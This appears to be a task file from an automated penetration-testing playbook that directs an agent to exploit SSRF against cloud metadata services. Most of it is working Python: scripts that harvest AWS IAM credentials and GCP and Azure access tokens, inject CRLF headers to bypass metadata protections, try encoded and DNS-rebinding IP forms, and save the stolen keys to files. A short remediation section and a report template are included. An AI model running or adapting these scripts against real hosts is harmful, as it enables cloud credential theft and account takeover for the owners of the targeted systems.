@@ -1,0 +1,1007 @@
+================================================================================
+TASK 87 - CLOUD METADATA SSRF (IMDS EXPLOITATION)
+================================================================================
+Covers testing_toolkit.txt Phase 13 Step 43
+Exploit confirmed SSRF to steal cloud credentials from metadata services
+
+THIS IS WHERE SSRF BECOMES CRITICAL:
+- SSRF alone = interesting
+- SSRF + Cloud Metadata = IAM credentials = GAME OVER
+
+You're not just reading files - you're stealing keys to the kingdom.
+
+================================================================================
+INPUTS
+================================================================================
+outputs/ssrf/ssrf_confirmed.txt            <- From Task (SSRF detection)
+outputs/ssrf/ssrf_endpoints.txt            <- Endpoints with SSRF
+outputs/live_base_urls.txt                 <- All targets
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/cloud/
+    imds_accessible.txt                    <- Hosts where metadata is reachable
+    iam_credentials.txt                    <- STOLEN IAM CREDENTIALS
+    cloud_provider_map.txt                 <- Which cloud per host
+    instance_metadata.txt                  <- All extracted metadata
+    exploitation_log.txt                   <- Full exploitation record
+
+outputs/vulnerabilities/IMDS-*-CRITICAL.md <- Individual findings
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+THINK LIKE AN ATTACKER WHO FOUND SSRF:
+
+    You have SSRF. Now what?
+    |
+    +-- Step 1: Identify Cloud Provider
+    |   |
+    |   +-- AWS: 169.254.169.254
+    |   +-- GCP: metadata.google.internal (requires header)
+    |   +-- Azure: 169.254.169.254 (requires header)
+    |   +-- DigitalOcean: 169.254.169.254
+    |   +-- Alibaba: 100.100.100.200
+    |
+    +-- Step 2: Check IMDSv1 vs IMDSv2
+    |   |
+    |   +-- IMDSv1: Direct GET request (EASY)
+    |   +-- IMDSv2: Requires PUT for token first (HARDER)
+    |   +-- GCP: Requires Metadata-Flavor: Google header
+    |   +-- Azure: Requires Metadata: true header
+    |
+    +-- Step 3: What to steal?
+        |
+        +-- IAM Credentials (HIGHEST VALUE)
+        |   +-- AWS: /iam/security-credentials/<role>
+        |   +-- GCP: /instance/service-accounts/default/token
+        |   +-- Azure: /metadata/identity/oauth2/token
+        |
+        +-- Instance Info (RECON)
+        |   +-- Instance ID, region, VPC
+        |   +-- Useful for lateral movement
+        |
+        +-- User Data (SECRETS)
+            +-- /user-data often contains bootstrap scripts
+            +-- May have hardcoded passwords, API keys
+
+    What blocks you?
+    |
+    +-- IMDSv2 (AWS) - Need token from PUT request
+    |   +-- Some SSRF can do PUT
+    |   +-- If not, look for other vectors
+    |
+    +-- Header requirements (GCP/Azure)
+    |   +-- SSRF must allow custom headers
+    |   +-- Try header injection in URL
+    |
+    +-- Network restrictions
+        +-- Some setups block metadata from apps
+        +-- Try different protocols (gopher://)
+
+================================================================================
+PHASE 1: CLOUD PROVIDER IDENTIFICATION
+================================================================================
+
+-----------------------------------------
+1.1 Fingerprint Cloud Environment
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+cloud_fingerprint.py - Identify which cloud provider hosts each target
+
+Before stealing creds, know which cloud you're in.
+"""
+
+import requests
+import socket
+import os
+
+requests.packages.urllib3.disable_warnings()
+
+# Cloud metadata endpoints
+CLOUD_FINGERPRINTS = {
+    'AWS': {
+        'metadata': 'http://169.254.169.254/latest/meta-data/',
+        'check': 'ami-id',
+        'headers': {}
+    },
+    'GCP': {
+        'metadata': 'http://metadata.google.internal/computeMetadata/v1/',
+        'check': 'instance',
+        'headers': {'Metadata-Flavor': 'Google'}
+    },
+    'Azure': {
+        'metadata': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+        'check': 'compute',
+        'headers': {'Metadata': 'true'}
+    },
+    'DigitalOcean': {
+        'metadata': 'http://169.254.169.254/metadata/v1/',
+        'check': 'droplet',
+        'headers': {}
+    },
+    'Alibaba': {
+        'metadata': 'http://100.100.100.200/latest/meta-data/',
+        'check': 'instance-id',
+        'headers': {}
+    },
+    'Oracle': {
+        'metadata': 'http://169.254.169.254/opc/v1/instance/',
+        'check': 'compartmentId',
+        'headers': {}
+    }
+}
+
+def identify_cloud_via_ssrf(ssrf_url, ssrf_param):
+    """Use SSRF to identify cloud provider"""
+    
+    results = []
+    
+    for cloud, config in CLOUD_FINGERPRINTS.items():
+        metadata_url = config['metadata']
+        
+        # Inject metadata URL via SSRF
+        test_url = f"{ssrf_url}?{ssrf_param}={metadata_url}"
+        
+        try:
+            # Note: Headers may not work through SSRF
+            resp = requests.get(test_url, verify=False, timeout=10)
+            
+            if config['check'] in resp.text.lower():
+                print(f"[+] CLOUD IDENTIFIED: {cloud}")
+                results.append({
+                    'cloud': cloud,
+                    'evidence': config['check'],
+                    'via': ssrf_url
+                })
+                return results
+                
+        except Exception as e:
+            pass
+    
+    return results
+
+# Also check via DNS/response headers
+def identify_cloud_external(url):
+    """Identify cloud from external indicators"""
+    
+    try:
+        resp = requests.get(url, verify=False, timeout=10)
+        headers = str(resp.headers).lower()
+        
+        indicators = {
+            'AWS': ['x-amz-', 'aws', 'amazonaws', 'cloudfront'],
+            'GCP': ['x-goog-', 'google', 'gstatic', 'appspot'],
+            'Azure': ['x-ms-', 'azure', 'windows.net', 'azurewebsites'],
+            'Cloudflare': ['cf-ray', 'cloudflare'],
+        }
+        
+        for cloud, checks in indicators.items():
+            for check in checks:
+                if check in headers or check in resp.text.lower()[:5000]:
+                    return cloud
+    except:
+        pass
+    
+    return None
+
+# Identify cloud for all targets
+os.makedirs('outputs/cloud', exist_ok=True)
+
+cloud_map = []
+
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        
+        print(f"[*] Identifying cloud: {url}")
+        cloud = identify_cloud_external(url)
+        
+        if cloud:
+            print(f"    -> {cloud}")
+            cloud_map.append(f"{url}|{cloud}")
+
+with open('outputs/cloud/cloud_provider_map.txt', 'w') as f:
+    for entry in cloud_map:
+        f.write(f"{entry}\n")
+
+================================================================================
+PHASE 2: IMDS EXPLOITATION (AWS)
+================================================================================
+
+-----------------------------------------
+2.1 AWS IMDSv1 (Easy Mode)
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+aws_imds_v1.py - Exploit IMDSv1 via SSRF (no token required)
+
+IMDSv1 = Simple GET requests = Easy cred theft
+Many older systems still use IMDSv1
+"""
+
+import requests
+import json
+import os
+
+requests.packages.urllib3.disable_warnings()
+
+# AWS metadata paths (IN ORDER OF VALUE)
+AWS_METADATA_PATHS = [
+    # HIGHEST VALUE - IAM credentials
+    '/latest/meta-data/iam/security-credentials/',
+    
+    # Instance identity
+    '/latest/meta-data/instance-id',
+    '/latest/meta-data/ami-id',
+    '/latest/meta-data/hostname',
+    '/latest/meta-data/local-ipv4',
+    '/latest/meta-data/public-ipv4',
+    '/latest/meta-data/mac',
+    
+    # Network info
+    '/latest/meta-data/network/interfaces/macs/',
+    '/latest/meta-data/placement/availability-zone',
+    '/latest/meta-data/placement/region',
+    
+    # User data (OFTEN HAS SECRETS)
+    '/latest/user-data',
+    
+    # Instance profile
+    '/latest/meta-data/iam/info',
+]
+
+def exploit_aws_imds_v1(ssrf_base, ssrf_param):
+    """
+    Exploit AWS IMDSv1 through SSRF
+    
+    ssrf_base: URL with SSRF vuln (e.g., https://target.com/proxy)
+    ssrf_param: Parameter that triggers SSRF (e.g., 'url')
+    """
+    
+    IMDS = 'http://169.254.169.254'
+    results = {
+        'iam_credentials': None,
+        'instance_info': {},
+        'user_data': None,
+        'raw_responses': {}
+    }
+    
+    print(f"[*] Exploiting AWS IMDSv1 via: {ssrf_base}?{ssrf_param}=...")
+    
+    # Step 1: Get IAM role name
+    role_url = f"{IMDS}/latest/meta-data/iam/security-credentials/"
+    ssrf_url = f"{ssrf_base}?{ssrf_param}={role_url}"
+    
+    try:
+        resp = requests.get(ssrf_url, verify=False, timeout=15)
+        
+        if resp.status_code == 200 and resp.text.strip():
+            role_name = resp.text.strip().split('\n')[0]
+            print(f"[+] IAM Role found: {role_name}")
+            
+            # Step 2: Get credentials for role
+            creds_url = f"{IMDS}/latest/meta-data/iam/security-credentials/{role_name}"
+            ssrf_creds = f"{ssrf_base}?{ssrf_param}={creds_url}"
+            
+            creds_resp = requests.get(ssrf_creds, verify=False, timeout=15)
+            
+            if creds_resp.status_code == 200:
+                try:
+                    creds = json.loads(creds_resp.text)
+                    print(f"[CRITICAL] IAM CREDENTIALS STOLEN!")
+                    print(f"    AccessKeyId: {creds.get('AccessKeyId', 'N/A')}")
+                    print(f"    SecretAccessKey: {creds.get('SecretAccessKey', 'N/A')[:20]}...")
+                    print(f"    Token: {creds.get('Token', 'N/A')[:50]}...")
+                    results['iam_credentials'] = creds
+                except:
+                    results['iam_credentials'] = creds_resp.text
+    except Exception as e:
+        print(f"[-] Error getting IAM creds: {e}")
+    
+    # Step 3: Get user-data (often has secrets)
+    userdata_url = f"{IMDS}/latest/user-data"
+    ssrf_ud = f"{ssrf_base}?{ssrf_param}={userdata_url}"
+    
+    try:
+        ud_resp = requests.get(ssrf_ud, verify=False, timeout=15)
+        if ud_resp.status_code == 200:
+            print(f"[+] User-data retrieved ({len(ud_resp.text)} bytes)")
+            results['user_data'] = ud_resp.text
+            
+            # Check for secrets in user-data
+            secrets_indicators = ['password', 'secret', 'key', 'token', 'api_key', 'aws_']
+            for indicator in secrets_indicators:
+                if indicator in ud_resp.text.lower():
+                    print(f"[!] POTENTIAL SECRET in user-data: '{indicator}' found")
+    except:
+        pass
+    
+    # Step 4: Get instance info
+    for path in AWS_METADATA_PATHS:
+        if 'security-credentials' in path or 'user-data' in path:
+            continue  # Already got these
+        
+        full_url = f"{IMDS}{path}"
+        ssrf_full = f"{ssrf_base}?{ssrf_param}={full_url}"
+        
+        try:
+            resp = requests.get(ssrf_full, verify=False, timeout=10)
+            if resp.status_code == 200:
+                key = path.split('/')[-1] or path.split('/')[-2]
+                results['instance_info'][key] = resp.text.strip()
+        except:
+            pass
+    
+    return results
+
+# Exploit all confirmed SSRF endpoints
+all_results = []
+
+with open('outputs/ssrf/ssrf_confirmed.txt') as f:
+    for line in f:
+        if line.startswith('#'):
+            continue
+        
+        parts = line.strip().split('|')
+        if len(parts) >= 2:
+            ssrf_url = parts[0]
+            ssrf_param = parts[1]
+            
+            result = exploit_aws_imds_v1(ssrf_url, ssrf_param)
+            
+            if result['iam_credentials']:
+                all_results.append({
+                    'source': ssrf_url,
+                    'credentials': result['iam_credentials']
+                })
+
+# Save stolen credentials
+with open('outputs/cloud/iam_credentials.txt', 'w') as f:
+    f.write("# STOLEN IAM CREDENTIALS\n")
+    f.write("# USE RESPONSIBLY - REPORT TO CLIENT\n\n")
+    for r in all_results:
+        f.write(f"Source: {r['source']}\n")
+        f.write(f"Credentials:\n{json.dumps(r['credentials'], indent=2)}\n")
+        f.write("="*60 + "\n")
+
+print(f"\n[*] Stole credentials from {len(all_results)} sources")
+
+-----------------------------------------
+2.2 AWS IMDSv2 (Token Required)
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+aws_imds_v2.py - Exploit IMDSv2 (requires PUT for token)
+
+IMDSv2 requires:
+1. PUT request to get token
+2. Token in header for subsequent requests
+
+Most SSRF only allows GET - but some allow PUT!
+"""
+
+import requests
+
+requests.packages.urllib3.disable_warnings()
+
+def exploit_aws_imds_v2(ssrf_base, ssrf_param, method='GET'):
+    """
+    Try IMDSv2 exploitation
+    
+    Requires SSRF that can:
+    1. Make PUT requests, OR
+    2. Set custom headers
+    """
+    
+    IMDS = 'http://169.254.169.254'
+    
+    # Step 1: Get token (requires PUT)
+    token_url = f"{IMDS}/latest/api/token"
+    
+    # Try through SSRF if it supports different methods
+    if method == 'PUT':
+        # Some SSRF allow method override via parameter
+        variants = [
+            f"{ssrf_base}?{ssrf_param}={token_url}&method=PUT",
+            f"{ssrf_base}?{ssrf_param}={token_url}&_method=PUT",
+            f"{ssrf_base}?{ssrf_param}={token_url}%26method=PUT",
+        ]
+        
+        for variant in variants:
+            try:
+                resp = requests.get(
+                    variant, 
+                    headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'},
+                    verify=False, 
+                    timeout=15
+                )
+                
+                if len(resp.text) > 20 and resp.status_code == 200:
+                    token = resp.text
+                    print(f"[+] IMDSv2 token obtained!")
+                    
+                    # Use token to get creds
+                    return exploit_with_token(ssrf_base, ssrf_param, token)
+            except:
+                pass
+    
+    print("[-] IMDSv2 token request failed (need PUT capability)")
+    return None
+
+def exploit_with_token(ssrf_base, ssrf_param, token):
+    """Use IMDSv2 token to get credentials"""
+    
+    IMDS = 'http://169.254.169.254'
+    
+    # Try header injection via SSRF
+    # Some SSRF allow: url=http://...%0d%0aX-aws-ec2-metadata-token: TOKEN
+    
+    role_url = f"{IMDS}/latest/meta-data/iam/security-credentials/"
+    
+    # Header injection attempts
+    injections = [
+        f"{role_url}%0d%0aX-aws-ec2-metadata-token:%20{token}",
+        f"{role_url}%0aX-aws-ec2-metadata-token:{token}",
+    ]
+    
+    for injection in injections:
+        ssrf_url = f"{ssrf_base}?{ssrf_param}={injection}"
+        
+        try:
+            resp = requests.get(ssrf_url, verify=False, timeout=15)
+            if resp.status_code == 200 and resp.text.strip():
+                print(f"[+] IMDSv2 header injection worked!")
+                return resp.text
+        except:
+            pass
+    
+    return None
+
+================================================================================
+PHASE 3: GCP METADATA EXPLOITATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+gcp_metadata.py - Exploit GCP metadata service
+
+GCP requires: Metadata-Flavor: Google header
+Challenge: Get SSRF to include custom header
+"""
+
+import requests
+import json
+
+requests.packages.urllib3.disable_warnings()
+
+GCP_METADATA = 'http://metadata.google.internal/computeMetadata/v1'
+
+# GCP metadata paths
+GCP_PATHS = [
+    # Service account token (HIGHEST VALUE)
+    '/instance/service-accounts/default/token',
+    '/instance/service-accounts/default/email',
+    '/instance/service-accounts/default/scopes',
+    
+    # Project info
+    '/project/project-id',
+    '/project/numeric-project-id',
+    
+    # Instance info
+    '/instance/hostname',
+    '/instance/id',
+    '/instance/zone',
+    '/instance/machine-type',
+    '/instance/network-interfaces/0/ip',
+    
+    # Attributes (may have secrets)
+    '/instance/attributes/',
+    '/project/attributes/',
+]
+
+def exploit_gcp_metadata(ssrf_base, ssrf_param):
+    """Exploit GCP metadata through SSRF"""
+    
+    results = {
+        'token': None,
+        'project': None,
+        'instance': {}
+    }
+    
+    print(f"[*] Exploiting GCP metadata via: {ssrf_base}")
+    
+    # GCP REQUIRES header: Metadata-Flavor: Google
+    # Try header injection techniques
+    
+    base_path = '/instance/service-accounts/default/token'
+    full_url = f"{GCP_METADATA}{base_path}"
+    
+    # Header injection variants
+    injections = [
+        # CRLF injection in URL
+        f"{full_url}%0d%0aMetadata-Flavor:%20Google",
+        f"{full_url}%0aMetadata-Flavor:Google",
+        
+        # Alternative metadata endpoints (some don't require header)
+        f"http://169.254.169.254/computeMetadata/v1{base_path}",
+        
+        # Beta endpoints
+        f"http://metadata.google.internal/computeMetadata/v1beta1{base_path}",
+    ]
+    
+    for injection in injections:
+        ssrf_url = f"{ssrf_base}?{ssrf_param}={injection}"
+        
+        try:
+            resp = requests.get(ssrf_url, verify=False, timeout=15)
+            
+            if 'access_token' in resp.text:
+                print(f"[CRITICAL] GCP TOKEN STOLEN!")
+                results['token'] = json.loads(resp.text)
+                return results
+                
+        except Exception as e:
+            pass
+    
+    # If SSRF allows custom headers
+    for path in GCP_PATHS:
+        full_url = f"{GCP_METADATA}{path}"
+        ssrf_url = f"{ssrf_base}?{ssrf_param}={full_url}"
+        
+        try:
+            # This only works if SSRF passes through headers
+            resp = requests.get(
+                ssrf_url,
+                headers={'Metadata-Flavor': 'Google'},  # Won't work through SSRF usually
+                verify=False,
+                timeout=10
+            )
+            
+            if resp.status_code == 200 and resp.text:
+                print(f"[+] {path}: {resp.text[:100]}")
+                results['instance'][path] = resp.text
+                
+        except:
+            pass
+    
+    return results
+
+================================================================================
+PHASE 4: AZURE METADATA EXPLOITATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+azure_metadata.py - Exploit Azure Instance Metadata Service (IMDS)
+
+Azure requires: Metadata: true header
+Alternative: Use specific API versions
+"""
+
+import requests
+import json
+
+requests.packages.urllib3.disable_warnings()
+
+AZURE_IMDS = 'http://169.254.169.254/metadata'
+
+# Azure metadata paths
+AZURE_PATHS = [
+    # Managed Identity token (HIGHEST VALUE)
+    '/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
+    '/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/',
+    '/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/',
+    
+    # Instance info
+    '/instance?api-version=2021-02-01',
+    '/instance/compute?api-version=2021-02-01',
+    '/instance/network?api-version=2021-02-01',
+    
+    # Scheduled events
+    '/scheduledevents?api-version=2020-07-01',
+]
+
+def exploit_azure_metadata(ssrf_base, ssrf_param):
+    """Exploit Azure IMDS through SSRF"""
+    
+    results = {
+        'tokens': [],
+        'instance': None,
+        'raw': {}
+    }
+    
+    print(f"[*] Exploiting Azure metadata via: {ssrf_base}")
+    
+    # Azure REQUIRES header: Metadata: true
+    # Try various bypass techniques
+    
+    for path in AZURE_PATHS:
+        full_url = f"{AZURE_IMDS}{path}"
+        
+        # Header injection attempts
+        injections = [
+            f"{full_url}%0d%0aMetadata:%20true",
+            f"{full_url}%0aMetadata:true",
+            f"{full_url}&metadata=true",  # Some proxies convert to header
+            full_url,  # Try without (sometimes works)
+        ]
+        
+        for injection in injections:
+            ssrf_url = f"{ssrf_base}?{ssrf_param}={injection}"
+            
+            try:
+                resp = requests.get(ssrf_url, verify=False, timeout=15)
+                
+                if 'access_token' in resp.text:
+                    print(f"[CRITICAL] AZURE TOKEN STOLEN!")
+                    token_data = json.loads(resp.text)
+                    print(f"    Resource: {token_data.get('resource', 'unknown')}")
+                    print(f"    Token: {token_data.get('access_token', '')[:50]}...")
+                    results['tokens'].append(token_data)
+                    
+                elif 'vmId' in resp.text or 'subscriptionId' in resp.text:
+                    print(f"[+] Instance metadata retrieved")
+                    results['instance'] = resp.text
+                    
+            except:
+                pass
+    
+    return results
+
+================================================================================
+PHASE 5: ALTERNATIVE METADATA URLS
+================================================================================
+
+#!/usr/bin/env python3
+"""
+alt_metadata.py - Try alternative/bypass metadata URLs
+
+Sometimes standard URLs are blocked but alternatives work.
+"""
+
+# Alternative URLs for AWS
+AWS_ALTERNATIVES = [
+    # IPv6
+    'http://[fd00:ec2::254]/latest/meta-data/',
+    
+    # Decimal IP
+    'http://2852039166/latest/meta-data/',
+    
+    # Hex IP  
+    'http://0xA9FEA9FE/latest/meta-data/',
+    
+    # Octal IP
+    'http://0251.0376.0251.0376/latest/meta-data/',
+    
+    # Mixed notation
+    'http://169.254.169.254.xip.io/latest/meta-data/',
+    'http://169.254.169.254.nip.io/latest/meta-data/',
+    
+    # With port
+    'http://169.254.169.254:80/latest/meta-data/',
+    
+    # DNS rebinding setup
+    'http://169-254-169-254.attacker.com/latest/meta-data/',
+]
+
+# Alternative URLs for GCP
+GCP_ALTERNATIVES = [
+    'http://169.254.169.254/computeMetadata/v1/',
+    'http://metadata.google.internal./computeMetadata/v1/',
+    'http://metadata/computeMetadata/v1/',
+]
+
+# Alternative URLs for Azure
+AZURE_ALTERNATIVES = [
+    'http://169.254.169.254/metadata/instance',
+    'http://169.254.169.254:80/metadata/instance',
+]
+
+def try_all_alternatives(ssrf_base, ssrf_param):
+    """Try all alternative metadata URLs"""
+    
+    all_urls = AWS_ALTERNATIVES + GCP_ALTERNATIVES + AZURE_ALTERNATIVES
+    
+    for alt_url in all_urls:
+        ssrf_url = f"{ssrf_base}?{ssrf_param}={alt_url}"
+        
+        try:
+            resp = requests.get(ssrf_url, verify=False, timeout=10)
+            
+            if resp.status_code == 200 and len(resp.text) > 10:
+                # Check for cloud indicators
+                indicators = ['ami-id', 'instance-id', 'access_token', 'vmId']
+                for ind in indicators:
+                    if ind in resp.text.lower():
+                        print(f"[+] ALTERNATIVE WORKED: {alt_url}")
+                        return {'url': alt_url, 'response': resp.text}
+        except:
+            pass
+    
+    return None
+
+================================================================================
+PHASE 6: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+imds_exploit_full.py - Complete IMDS exploitation via SSRF
+"""
+
+import os
+import json
+import requests
+import hashlib
+
+requests.packages.urllib3.disable_warnings()
+
+class IMDSExploiter:
+    
+    def __init__(self):
+        self.results = {
+            'aws_creds': [],
+            'gcp_tokens': [],
+            'azure_tokens': [],
+            'metadata': [],
+            'errors': []
+        }
+        os.makedirs('outputs/cloud', exist_ok=True)
+        os.makedirs('outputs/vulnerabilities', exist_ok=True)
+    
+    def exploit_aws(self, ssrf_base, ssrf_param):
+        """Full AWS exploitation"""
+        
+        IMDS = 'http://169.254.169.254'
+        
+        # Try to get IAM role
+        role_path = '/latest/meta-data/iam/security-credentials/'
+        ssrf_url = f"{ssrf_base}?{ssrf_param}={IMDS}{role_path}"
+        
+        try:
+            resp = requests.get(ssrf_url, verify=False, timeout=15)
+            
+            if resp.status_code == 200 and resp.text.strip():
+                role = resp.text.strip().split('\n')[0]
+                
+                # Get credentials
+                creds_path = f"{role_path}{role}"
+                creds_url = f"{ssrf_base}?{ssrf_param}={IMDS}{creds_path}"
+                creds_resp = requests.get(creds_url, verify=False, timeout=15)
+                
+                if 'AccessKeyId' in creds_resp.text:
+                    creds = json.loads(creds_resp.text)
+                    self.results['aws_creds'].append({
+                        'source': ssrf_base,
+                        'role': role,
+                        'credentials': creds
+                    })
+                    return creds
+        except Exception as e:
+            self.results['errors'].append(f"AWS {ssrf_base}: {e}")
+        
+        return None
+    
+    def exploit_gcp(self, ssrf_base, ssrf_param):
+        """Full GCP exploitation with header bypass attempts"""
+        
+        GCP = 'http://metadata.google.internal/computeMetadata/v1'
+        token_path = '/instance/service-accounts/default/token'
+        
+        # Try header injection
+        injections = [
+            f"{GCP}{token_path}%0d%0aMetadata-Flavor:%20Google",
+            f"{GCP}{token_path}%0aMetadata-Flavor:Google",
+            f"http://metadata.google.internal/computeMetadata/v1beta1{token_path}",
+        ]
+        
+        for injection in injections:
+            try:
+                ssrf_url = f"{ssrf_base}?{ssrf_param}={injection}"
+                resp = requests.get(ssrf_url, verify=False, timeout=15)
+                
+                if 'access_token' in resp.text:
+                    token = json.loads(resp.text)
+                    self.results['gcp_tokens'].append({
+                        'source': ssrf_base,
+                        'token': token
+                    })
+                    return token
+            except:
+                pass
+        
+        return None
+    
+    def exploit_azure(self, ssrf_base, ssrf_param):
+        """Full Azure exploitation with header bypass attempts"""
+        
+        AZURE = 'http://169.254.169.254/metadata'
+        token_path = '/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
+        
+        # Try header injection
+        injections = [
+            f"{AZURE}{token_path}%0d%0aMetadata:%20true",
+            f"{AZURE}{token_path}%0aMetadata:true",
+        ]
+        
+        for injection in injections:
+            try:
+                ssrf_url = f"{ssrf_base}?{ssrf_param}={injection}"
+                resp = requests.get(ssrf_url, verify=False, timeout=15)
+                
+                if 'access_token' in resp.text:
+                    token = json.loads(resp.text)
+                    self.results['azure_tokens'].append({
+                        'source': ssrf_base,
+                        'token': token
+                    })
+                    return token
+            except:
+                pass
+        
+        return None
+    
+    def generate_report(self, finding, cloud_type):
+        """Generate vulnerability report"""
+        
+        vuln_id = hashlib.md5(str(finding).encode()).hexdigest()[:8]
+        
+        report = f"""# Cloud Credential Theft via SSRF - {cloud_type}
+
+**Severity**: CRITICAL
+**CVSS**: 9.8+
+**Source**: {finding.get('source', 'N/A')}
+
+## Description
+Server-Side Request Forgery (SSRF) vulnerability allowed access to cloud 
+Instance Metadata Service (IMDS), resulting in theft of cloud credentials.
+
+## Credentials Obtained
+```json
+{json.dumps(finding.get('credentials') or finding.get('token'), indent=2)}
+```
+
+## Impact
+- **Full cloud account access** via stolen IAM/Service Account credentials
+- Access to all resources the instance role has permissions for
+- Potential lateral movement to other cloud services
+- Data exfiltration from S3/GCS/Azure Storage
+- Privilege escalation within cloud environment
+
+## Recommendations
+1. Enable IMDSv2 (AWS) - requires token for access
+2. Restrict metadata service access via firewall rules
+3. Use minimal IAM permissions (principle of least privilege)
+4. Deploy SSRF protections (URL validation, blocklists)
+"""
+        
+        with open(f"outputs/vulnerabilities/IMDS-{cloud_type}-{vuln_id}-CRITICAL.md", 'w') as f:
+            f.write(report)
+    
+    def scan(self, ssrf_file):
+        """Full IMDS exploitation scan"""
+        
+        with open(ssrf_file) as f:
+            lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
+        
+        print(f"[*] Exploiting {len(lines)} SSRF endpoints for cloud creds...")
+        
+        for line in lines:
+            parts = line.split('|')
+            if len(parts) < 2:
+                continue
+            
+            ssrf_base = parts[0]
+            ssrf_param = parts[1]
+            
+            print(f"\n[*] Target: {ssrf_base}")
+            
+            # Try all clouds
+            aws = self.exploit_aws(ssrf_base, ssrf_param)
+            if aws:
+                print(f"[CRITICAL] AWS CREDENTIALS STOLEN!")
+                self.generate_report({'source': ssrf_base, 'credentials': aws}, 'AWS')
+            
+            gcp = self.exploit_gcp(ssrf_base, ssrf_param)
+            if gcp:
+                print(f"[CRITICAL] GCP TOKEN STOLEN!")
+                self.generate_report({'source': ssrf_base, 'token': gcp}, 'GCP')
+            
+            azure = self.exploit_azure(ssrf_base, ssrf_param)
+            if azure:
+                print(f"[CRITICAL] AZURE TOKEN STOLEN!")
+                self.generate_report({'source': ssrf_base, 'token': azure}, 'Azure')
+        
+        return self.results
+    
+    def save(self):
+        """Save all results"""
+        
+        with open('outputs/cloud/imds_results.json', 'w') as f:
+            json.dump(self.results, f, indent=2)
+        
+        # Separate credentials file (HIGH VALUE)
+        with open('outputs/cloud/iam_credentials.txt', 'w') as f:
+            f.write("# STOLEN CLOUD CREDENTIALS\n\n")
+            
+            for cred in self.results['aws_creds']:
+                f.write(f"=== AWS ({cred['role']}) ===\n")
+                f.write(f"Source: {cred['source']}\n")
+                f.write(json.dumps(cred['credentials'], indent=2))
+                f.write("\n\n")
+            
+            for token in self.results['gcp_tokens']:
+                f.write(f"=== GCP ===\n")
+                f.write(f"Source: {token['source']}\n")
+                f.write(json.dumps(token['token'], indent=2))
+                f.write("\n\n")
+            
+            for token in self.results['azure_tokens']:
+                f.write(f"=== Azure ===\n")
+                f.write(f"Source: {token['source']}\n")
+                f.write(json.dumps(token['token'], indent=2))
+                f.write("\n\n")
+
+# Run
+if __name__ == "__main__":
+    exploiter = IMDSExploiter()
+    exploiter.scan('outputs/ssrf/ssrf_confirmed.txt')
+    exploiter.save()
+    
+    total = (len(exploiter.results['aws_creds']) + 
+             len(exploiter.results['gcp_tokens']) + 
+             len(exploiter.results['azure_tokens']))
+    
+    print(f"\n{'='*60}")
+    print(f"[*] AWS credentials: {len(exploiter.results['aws_creds'])}")
+    print(f"[*] GCP tokens: {len(exploiter.results['gcp_tokens'])}")
+    print(f"[*] Azure tokens: {len(exploiter.results['azure_tokens'])}")
+    print(f"[*] TOTAL STOLEN: {total}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] Cloud provider identified for each target
+[ ] IMDSv1 exploitation attempted (AWS)
+[ ] IMDSv2 bypass attempted (token via PUT/header injection)
+[ ] GCP metadata with header bypass attempted
+[ ] Azure metadata with header bypass attempted
+[ ] Alternative IP formats tested
+[ ] All stolen credentials saved
+[ ] Vulnerability reports generated
+
+================================================================================
+TOOLS REFERENCE
+================================================================================
+
+CLOUD METADATA ENDPOINTS:
+- AWS: 169.254.169.254
+- GCP: metadata.google.internal (header required)
+- Azure: 169.254.169.254 (header required)
+- DigitalOcean: 169.254.169.254
+- Alibaba: 100.100.100.200
+
+BYPASS TECHNIQUES:
+- IMDSv2: PUT request or header injection
+- GCP: Header injection, beta endpoints
+- Azure: Header injection, API version manipulation
+- All: Alternative IP formats, DNS rebinding
+
+HIGH VALUE PATHS:
+- AWS: /iam/security-credentials/<role>
+- GCP: /instance/service-accounts/default/token
+- Azure: /identity/oauth2/token
+
+SEVERITY: CRITICAL (9.8+)
+- Direct cloud credential theft
+- Full account compromise potential
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 88: Cloud Bucket Enumeration & Abuse
